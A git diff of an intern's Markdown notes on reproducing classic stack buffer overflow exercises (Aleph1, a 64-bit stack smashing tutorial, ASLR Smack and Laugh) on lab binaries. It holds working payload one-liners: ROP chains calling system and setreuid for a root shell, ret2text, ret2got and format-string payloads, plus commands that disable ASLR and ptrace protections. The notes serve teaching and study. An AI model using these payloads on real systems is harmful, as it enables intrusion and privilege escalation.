@@ -2,12 +2,14 @@
 pagetitle:  Notes for the Stack Buffer Overflow internship at INRIA Sophia
 title:      Notes for the Stack Buffer Overflow internship at INRIA Sophia
 author:     Florian Hofhammer
-date:       2020-04-24
+date:       2020-04-27
 ---
 
 # Virtual Machine setup
 
-The virtual machine used for the experiments is based on the Ubuntu 19.10 Desktop distribution with Linux kernel 5.3.0 and GLIBC 2.30.
+## Basic information
+
+The virtual machine used for the experiments is based on the Ubuntu 20.04 Desktop distribution with Linux kernel 5.4.0, GLIBC 2.31 and GCC 9.3.0 and runs in VirtualBox 6.1.
 Updates are regularly installed to keep the system up to date.   
 ASLR is permanently deactivated on the machine by issuing the command `echo "kernel.randomize_va_space = 0" | sudo tee /etc/sysctl.d/01-disable-aslr.conf`.   
 Support for compiling 32 bit executables was added by running
@@ -19,18 +21,46 @@ Support for compiling 32 bit executables was added by running
 ```
 
 The machine the VM runs on is based on an Intel Core i5 6300HQ processor.
-This processor does not support Intel CET (Control-flow Enforcement Technology).
-This processor feature might lead to failures when running the described exploits on more modern Intel processors.
+This processor does __not__ support Intel CET (Control-flow Enforcement Technology).
+This processor feature might lead to failures when running the described exploits on more modern Intel processors (i.e. Tiger Lake (11th Gen Intel Core) or higher according to a [windows-internals.com blog post](https://windows-internals.com/cet-on-windows/)).
 In order to disable this feature in the executables, add the `-fcf-protection=none` compiler flag.   
 As the compiler output differs depending on this flag being present or not, adaptations of addresses used for the exploits might be necessary.
 
-As the GDB version 8.3 included in the default Ubuntu repositories kept crashing, I installed GDB 9.1 from the source provided on the [official website](https://www.gnu.org/software/gdb/).
-Additionally, I installed `peda`, `pwndbg` and `gef` for easier debugging using an install script from a [GitHub repository](https://github.com/apogiatzis/gdb-peda-pwndbg-gef) as well as Python `pwntools` (version 4.0.1) via `pip install pwntools` for easier exploit creation.   
-I also mounted the directory containing the internship data and files into the virtual machine and installed the OpenSSH Server to be able to `ssh` into the virtual machine and execute all the code whilst not having to make any changes to the host machine.
-It is, however, important to point out that if accessing a shell via `ssh` in the VM, the stack addresses may differ from those when directly opening a terminal in the VM.
-In addition, the `ssh` session adds additional information to the environment by setting environment variables which might lead to different offsets on the stack.
+The whole development process is conducted on the host machine of the VM where the VM could access the files via a shared directory.
+Compilation and execution of the compiled executables is conducted via a SSH shell.
+Thus, if developing and executing exploits directly in the VM, the shell's environment may differ and adaptations might be necessary.
+However, this remote development approach is not a prerequisite for the steps described in the following sections.
+It is just a personal preference (see also section [optional configuration](#optional-configuration)).
 
-Apart from that, no changes to the system were made.
+## Necessary configuration
+
+Some of the exploits (e.g. for the [64 bit stack smashing tutorial](#64-bit-linux-stack-smashing) or the [stack canary bypass](#stack-canary-bypassing)) were conducted using Python code based on the `pwntools` library.
+This library can be installed by invoking `pip3 install pwntools`.
+Dependencies should be installed automatically.
+If not so, those of course also have to be installed.
+
+## Optional configuration
+
+In order to ease debugging, I installed `peda`, `pwndbg` and `gef` using an install script from a [GitHub repository](https://github.com/apogiatzis/gdb-peda-pwndbg-gef).
+All of those three are extensions to the GDB debugger which improve the interface and provide additional commands which ease debugging greatly.   
+As they are based on the GDB Python API and partly still use Python 2.7 (which by default is not included in current Ubuntu releases), it may be necessary to install the `python2-dev` package via `sudo apt install python2-dev`.
+If dependencies for the GDB extensions are missing, they also have to be installed via `pip`, e.g. `python2 -m pip install setuptools` to install the Python setup tools for Python 2.7.
+
+Looking at Python, the package `python-is-python3` (installed via `sudo apt install python-is-python3`) makes `python` an alias for `python3`.
+This is just a convenient alias if the personal workflow includes just calling `python` instead of specifiying the Python version.
+
+I also mounted the directory containing the internship data and files into the virtual machine and installed the OpenSSH Server (`sudo apt install openssh-server`) to be able to `ssh` into the virtual machine and execute all the code whilst not having to make any changes to the host machine.
+It is, however, important to point out that if accessing a shell via `ssh` in the VM, the stack addresses may differ from those when directly opening a terminal in the VM, as the `ssh` session adds additional information to the environment by setting environment variables which might lead to different offsets on the stack.
+
+Additionally, I installed the disassembler and debugger `radare2` from [GitHub](https://github.com/radareorg/radare2) for easy disassembly analysis.
+Installation was conducted by calling `git clone https://github.com/radareorg/radare2.git && ./radare2/sys/install.sh`.
+
+Other useful installed tools include `ropper` and `ROPgadget` which make it easier to find gadgets for return-oriented programming (ROP).
+Those were installed with `pip3 install ropper ropgadget`.
+For further information, see the GitHub repositories for [ropper](https://github.com/sashs/Ropper) and [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).
+
+All of those tools and installation steps are fully optional, the exploits work without those just fine.
+However, they can greatly reduce the time to find bugs and improve the exploit development process.
 
 # Smashing the Stack for fun and profit - Aleph1
 
@@ -59,7 +89,7 @@ The problem here is that a value is popped from the stack into `ecx` and an offs
 As we overwrite the stack with the buffer address, `esp` then points before the buffer instead of on the stack where the buffer address resides.
 Thus, the `ret` instruction fetches the wrong address and the exploit doesn't work.
 
-After having a lot of problems with this issue, I found a comment online suggesting to add the `-mpreferred-stack-boundary=2` compiler flag which instructs `gcc` to align on 4 bytes (2^2) instead of 16 bytes.
+After having a lot of problems with this issue, I found a comment online suggesting to add the `-mpreferred-stack-boundary=2` compiler flag which instructs `gcc` to align on 4 bytes (2^2) (as it is the default on 32 bit architectures) instead of 16 bytes (as it is the default on 64 bit architectures).
 __This additional flag is used throughout all of the following examples if compiled in 32 bit mode!__
 With this change, the same part of the assembly code was generated as follows:
 
@@ -88,7 +118,7 @@ The buffer size tells the executable how many bytes should be filled with the sh
 This approach requires to exactly provide the correct buffer address in order to overwrite the return address with exactly the address of the start of the shellcode.
 This implies that being off by only a single byte probably causes the program to crash instead of spawning a shell.
 
-With modern compilers (`gcc 9.2.1`), the stack offset is different than that given in Aleph1's original paper: instead of calling `exploit2 600 1564` for a buffer size of 600 bytes filled with shellcode and stack address as well as an offset of 1564 bytes from the base stack address, it is sufficient to call `exploit2 600` which doesn't use an offset at all.
+With modern compilers (see [Virtual machine basic information](#basic-information)), the stack offset is different than that given in Aleph1's original paper: instead of calling `exploit2 600 1564` for a buffer size of 600 bytes filled with shellcode and stack address as well as an offset of 1564 bytes from the base stack address, it is necessary to call `exploit2 600 1660` which uses the same buffer size but a different offset.
 
 ### exploit3
 
@@ -106,12 +136,9 @@ Because of the NOP sled in front of the shellcode, it is then pretty easy to fin
 `exploit4` works just like `exploit3` but instead of writing the NOP sled and the shellcode to the buffer, it writes them to an environment variable and only an address pointing to that variable into the buffer.
 This way, we're not restricted by the buffer size concerning our NOP sled but we can make it as big as we want it to be.
 
-However, a similar problem compared to `exploit3` occurs with `exploit4`.
-As the compiler and runtime on modern machines differ from the ones used by Aleph1, it is necessary to add an offset.
-Calling `exploit4 600` and then `vulnerable $RET` is not sufficient and only yields a segmentation fault.
-When debugging the `vulnerable` executable, it is easy to see that the return address is correctly rewritten by the input given in the environment variable `RET` but that the address in that environment variable is way too low.
-Thus, we have to increase the address in order to jump into the NOP sled inside the environment variable `EGG`.
-Calling e.g. `exploit4 600 -2000` gives a working offset so that the address saved in `RET` points into the NOP sled saved in `EGG`.
+In contrast to `exploit3`, `exploit4` can directly be called with e.g. `exploit4 600` for a buffer size of `600` bytes and no offset.
+Calling `vulnerable $RET` in the newly spawned shell, we achieve a buffer overflow and shellcode execution.
+Thus, putting a huge NOP sled into an environment variable certainly again increases the chance of hitting the shellcode when returning from the `main` function.
 
 ### eggshell
 
@@ -125,8 +152,8 @@ Thus, the shellcode tries to execute `/bin/s` instead of `/bin/sh`, which of cou
 
 Changing the comparison from `i <= eggsize ...` to `i < eggsize ...` fixes that problem, as one less NOP instruction is written to the egg buffer and thus the actual shellcode starts at a lower position in the buffer.
 
-Again, providing no offset, the address in `BOF` does not point to the `EGG` environment variable.
-Just like with `exploit4`, it is easy to find a fitting offset with a debugger by looking at the difference of the provided (incorrect) address and the address of the `EGG` variable (e.g. by issuing `search "EGG"` in `gdb` with the `pwndbg` plugin).
+Providing no offset as with `exploit4`, the address in `BOF` does not point to the `EGG` environment variable.
+Just like with `exploit3`, it is easy to find a fitting offset with a debugger by looking at the difference of the provided (incorrect) address and the address of the `EGG` variable (e.g. by issuing `search "EGG"` in `gdb` with the `pwndbg` plugin).
 Thus, calling e.g. `eggshell -b 600 -o -2000` lets us spawn a shell from the `vulnerable` executable.
 
 Additionally, appending the `-s` flag to the `eggshell` call uses a different shellcode which not only spawns a shell but also calls `setreuid(geteuid(), geteuid())` before.
@@ -155,6 +182,7 @@ As libc is included as a shared library, the code in there has to be executable.
 This way, we can work around the restriction that the NX bit might be set on the stack and our shellcode from the stack might not be executable.
 
 The necessary steps are the following:
+
 1. Find the address of the `system` function in libc via `gdb` (note: ASLR is still disabled, the address thus stays the same)
 2. Find a pointer to the string "/bin/sh" (easy, already included in the executable (see [vulnerable.c](./64bit%20Stack%20smashing%20-%20superkojiman/vulnerable.c#L14)))
 3. Find a gadget to load the pointer to this string into the register `rdi` before calling `system` (can be found in `__libc_csu_init`)
@@ -162,11 +190,11 @@ The necessary steps are the following:
 
 The code is then the following (`cat` is necessary for keeping the shell open):
 ```bash
-(python -c "from struct import pack; print(
-    'A' * 104 +                         # Padding to reach the return address
+(python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(
+    b'A' * 104 +                        # Padding to reach the return address
     pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
     pack('<Q', 0x000055555555603f) +    # Address of "/bin/sh" in function main
-    pack('<Q', 0x00007ffff7e1a4e0)      # Address of function system
+    pack('<Q', 0x00007ffff7e18410)      # Address of function system
     )"; cat) | ./vulnerable
 ```
 
@@ -182,29 +210,29 @@ Such an instruction has no effect: when we return to this instruction, it immedi
 
 Thus, a fixed version of the code is as follows:
 ```bash
-(python -c "from struct import pack; print(
-    'A' * 104 +                         # Padding to reach the return address
+(python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(
+    b'A' * 104 +                        # Padding to reach the return address
     pack('<Q', 0x00005555555551da) +    # Address of ret in function vuln
     pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
     pack('<Q', 0x000055555555603f) +    # Address of "/bin/sh" in function main
-    pack('<Q', 0x00007ffff7e1a4e0)      # Address of function system
+    pack('<Q', 0x00007ffff7e18410)      # Address of function system
     )"; cat) | ./vulnerable
 ```
 
 If the SUID bit is set on the executable and it is owned by root, we can spawn a root shell with the following code:
 ```bash
-(python -c "from struct import pack; print(
-    'A' * 104 +                         # Padding to reach the return address
+(python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(
+    b'A' * 104 +                        # Padding to reach the return address
     pack('<Q', 0x00005555555551da) +    # Address of ret in function vuln
     pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
     pack('<Q', 0x0000000000000000) +    # Value 0 => uid of root
     pack('<Q', 0x0000555555555271) +    # Address of pop rsi; pop r15; ret in function __libc_csu_init
     pack('<Q', 0x0000000000000000) +    # Value 0 => uid of root (into rsi)
     pack('<Q', 0x4141411411414141) +    # Junk (into r15)
-    pack('<Q', 0x00007ffff7edcc20) +    # Address of function setreuid
+    pack('<Q', 0x00007ffff7eda920) +    # Address of function setreuid
     pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
     pack('<Q', 0x000055555555603f) +    # Address of "/bin/sh" in function main
-    pack('<Q', 0x00007ffff7e1a4e0)      # Address of function system
+    pack('<Q', 0x00007ffff7e18410)      # Address of function system
     )"; cat) | ./vulnerable
 ```
 This code additionally calls `setreuid(0, 0)` before spawning the shell.
@@ -223,10 +251,11 @@ However, it would probably still be necessary to get the address of the `system`
 For the [third part](https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/) of the 64 bit stack smashing tutorial, ASLR is enabled (e.g. by the command `echo 2 | sudo tee /proc/sys/kernel/randomize_va_space`).
 Additionally, the Linux kernel by default disables `ptrace` functionality for security reasons.
 With this restriction, it is not possible to attach the debugger to an already running process.
-Thus, it is necessary to enable ptracing by issuing the command `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`.
+Thus, it is necessary to enable ptracing by issuing the command `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` for debugging.
 
 The exploit is based on the executable being available over the network (`socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./vulnerable_advanced`) because we can then easily issue the distinct stages of the exploit.
 The exploit then consists of the following steps:
+
 1. Leak `memset` address from the Global Offset Table (GOT)
 2. Calculate the libc base address by the `memset` address and the known (fixed) offset of `memset` in libc
 3. Calculate the address of `system` by the libc base address and the known (fixed) offset of `system` in libc
@@ -235,12 +264,13 @@ The exploit then consists of the following steps:
 6. Call `memset` again which in fact calls `system`
 
 The following difficulties occured during those steps and the development of that exploit:
+
 1. It is not possible to set a breakpoint in the vulnerable executable and attach GDB to the running process, as `socat` only executes the vulnerable executable on a new connection and the memory the breakpoint refers to thus is not loaded yet.
    This behavior leads to an error in GDB because it cannot access the memory at the specified location.    
    This problem can be solved by setting a breakpoint, disabling the breakpoint, setting a catchpoint on execution of a new executable and continuing.
    GDB then automatically breaks when `socat` spawns the vulnerable executable.
    Then, it is sufficient to enable the breakpoint again and continue, as the corresponding address is now located in memory.
-   The first automatic steps (until breaking at the catchpoint) can be achieved by the command `gdb-pwndbg -ex "b BREAK" -ex "dis" -ex "catch exec" -ex "c" -q -p $(pidof socat)`, where BREAK is the breakpoint (no matter whether using `gdb`, `gdb-pwndbg`, etc.).
+   The first automatic steps (until breaking at the catchpoint) can be achieved by the command `gdb-pwndbg -ex "b BREAK" -ex "dis" -ex "catch exec" -ex "c" -q -p $(pidof socat)`, where `BREAK` is the breakpoint (no matter whether using `gdb`, `gdb-pwndbg`, etc.).
 2. The offset for `memset` in libc cannot be determined as it is the case in the tutorial.
    If the offset is determined like that, we only have the offset to the generic `memset` function.
    However, on modern Linux systems, the GNU IFUNC functionality dispatches dynamically to specialized functions depending on CPU features.
@@ -264,7 +294,7 @@ It relies on the executable being available over the network as mentioned above.
 
 However, it is also possible to launch such an exploit locally.
 This was conducted using the Python `pwntools`.
-The [poc_local.py](./64bit%20Stack%20smashing%20-%20superkojiman/poc_local.py) contains the code for this exploit.
+The [poc_local.py](./64bit%20Stack%20smashing%20-%20superkojiman/poc_local.py) contains the code for a local exploit.
 In addition to the original exploit, this variant also calls `setreuid` in order to achieve privilege escalation when a vulnerable executable with the SUID bit set is exploited.
 
 # ASLR Smack and Laugh
@@ -319,9 +349,9 @@ The exploit itself is pretty easy then:
 
 * Look up the address of the function we want to jump to (here: `secret`) via `gdb` or `objdump`
 * Calculate the string used for overwriting the buffer (here: 16 bytes padding (12 for the buffer, 4 for the frame pointer) + return address)
-* Execute the program (here: `./ret2text $(python -c "print('A' * 16 + '\xff\x91\x04\x08')")`)
+* Execute the program (here: `./ret2text $(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 16 + b'\xff\x91\x04\x08')")`)
 
-An interesting observation is that it is completely sufficient to call `./ret2text $(python -c "print('A' * 16")`.
+An interesting observation is that it is completely sufficient to call `./ret2text $(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 16)")`.
 This doesn't actually overwrite the return address completely, in fact we're not even accessing the memory where the return address resides intentionally.
 As any string ends with a 0 byte and we have little endian representation, the input consisting of 16 A characters (or any 16 bytes except 0 bytes) overwrites the lowest byte of the return address unintentionally with 0.
 Coincidentally, the return address formerly pointing back into the `main` function points to the second byte of the `secret` function if the last byte of the address is set to 0.
@@ -372,7 +402,7 @@ It is easy to find the addresses if such a vulnerability can be found.
 
 In the given example, we can overwrite the function pointer with the address of `system`'s PLT entry.
 Thus, `system` is executed instead of the actual function.
-With the command `./funcptr "$(python -c "print('A' * 64 + '\xa0\x90\x04\x08')")" /bin/sh`, we can spawn a shell.
+With the command `./funcptr "$(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 64 + b'\xa0\x90\x04\x08')")" /bin/sh`, we can spawn a shell.
 The first argument overwrites the pointer, the second argument contains the command to execute.
 
 However, this kind of exploit is probably mightier than the string pointer exploit: with the latter, we can only control which new program to execute.
@@ -390,7 +420,7 @@ The problem that arises is that the maximum positive value of a `char` is 127 an
 If we know input a string longer than 127 bytes (e.g. 128 bytes), we achieve an overflow and we can control the value of the `char` holding the string length.
 If we input for example a string with a length of 128 bytes, `isize` holds the value -128 after measuring the string length because of the overflow and we can copy the input to the buffer and achieve a buffer overflow.
 
-For example with the command `./width $(python -c "print('A' * 88 + '\xf6\x91\x04\x08'  + 'A' * 36)")`, we jump to the secret function that is not used during normal execution.
+For example with the command `./width $(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 88 + b'\xf6\x91\x04\x08'  + b'A' * 36)")`, we jump to the secret function that is not used during normal execution.
 The first 88 bytes are used for padding until we reach the part of memory where the return address resides, the next four bytes overwrite the return address and the following 36 bytes are necessary to achieve a string length of 128 bytes and thus bypass the length check by overflowing the value of `isize`.
 
 Just like with other methods above, this method could be used for building a ROP chain or similar.
@@ -522,7 +552,7 @@ The next call to `printf` then executes `system` instead with the arguments pass
 
 As we can only partially control the arguments of `printf`, it is necessary to set up an environment similar to the one from the [string pointer redirection exploit](#string-pointers), where we cannot control the input to `system` but where we provide an executable shell script whos name matches the first word of the `system` argument.
 This script can be created by the command `echo /bin/sh > Array && chmod 777 Array && export PATH=.:$PATH`.
-Calling then `./ret2got "$(python -c "print('A' * 8 + '\x0c\xc0\x04\x08')")" "$(python -c "print('\xa0\x90\x04\x08')")"` yields the described exploit.
+Calling then `./ret2got "$(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 8 + b'\x0c\xc0\x04\x08')")" "$(python3 -c "import sys; sys.stdout.buffer.write(b'\xa0\x90\x04\x08')")"` yields the described exploit.
 
 The steps to this exploit are combined into the [ret2gotexploit.sh](./ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2gotexploit.sh) shell script.
 
@@ -541,6 +571,7 @@ Thus, we cannot directly control the program flow when returning from the vulner
 The overwritten byte usually gets turned into a `0x00` byte, as such a vulnerability most of the time occurs when copying a string and strings end with a `0x00` byte.
 Thus, we can lower the saved frame pointer and by some luck it might point back into the buffer that was used for the overflow.   
 The strategy is then as follows:
+
 1. Fill the buffer with a `ret` chain that ends in a `jmp esp` instruction (similar to the [ret2esp](#ret2esp) exploit)
 2. Place the shellcode after the address of such a `jmp esp` instruction (possibly padded with NOPs to achieve the correct buffer size and stack alignment)
 
@@ -560,9 +591,10 @@ The overwritten pointers should then point to an array on the heap containing sh
 It is thus more or less a ret2heap exploit with the difference that not the return address is overwritten with a pointer to the heap by a simple stack buffer overflow but a destructor function pointer by a string format vulnerability.
 
 There are several reasons why this exploit does not work exactly like that:
+
 1. A `.dtors` section does not exist in executables created by modern compilers/linkers.
    There is a pretty much equivalent section, `.fini_array` which also contains pointers to functions which should be run after `main` returns.
-   However, the structure is a little bit different, as `.dtors` has start and end markers (0xffffffff and 0x00000000, respectively) which `.fini_array` does not have.
+   However, the structure is a little bit different, as `.dtors` has start and end markers (`0xffffffff` and `0x00000000`, respectively) which `.fini_array` does not have.
 2. With modern ASLR, heap addresses are also completely randomized and we cannot use the heap to store the shellcode.
    A solution to that issue is storing the shellcode in a global array (which is located in the non-randomized `.bss` section of the ELF executable) instead.
    Thus, the exploit becomes a ret2bss exploit instead of ret2heap.
@@ -582,7 +614,7 @@ There are several reasons why this exploit does not work exactly like that:
    Thus, we only get a segmentation fault when trying to overwrite a pointer in this section like described above.   
    The solution is to disable RELRO by passing the additional linker flag `-z norelro` when linking the executable.
 
-In conclusion, an exploit is possible (command `./ret2dtors "$(./shellcode)" "$(python -c "print('\x68\xb1\x04\x08' + 'A' * 45724 + '%hn')")"` where `shellcode` is a helper executable just outputting shellcode (see [shellcode.c](./ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/shellcode.c))) but only with severe changes.   
+In conclusion, an exploit is possible (command `./ret2dtors "$(./shellcode)" "$(python3 -c "import sys; sys.stdout.buffer.write(b'\x68\xb1\x04\x08' + b'A' * 45724 + b'%hn')")"` where `shellcode` is a helper executable just outputting shellcode (see [shellcode.c](./ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/shellcode.c))) but only with severe changes.   
 Firstly, it is not possible to use the heap.
 We have to rely on an array in the `.bss` or `.data` section (c.f. [ret2bss](#ret2bss) and [ret2data](#ret2data)), i.e. a global array.   
 Secondly, we have to link the executable with RELRO disabled.
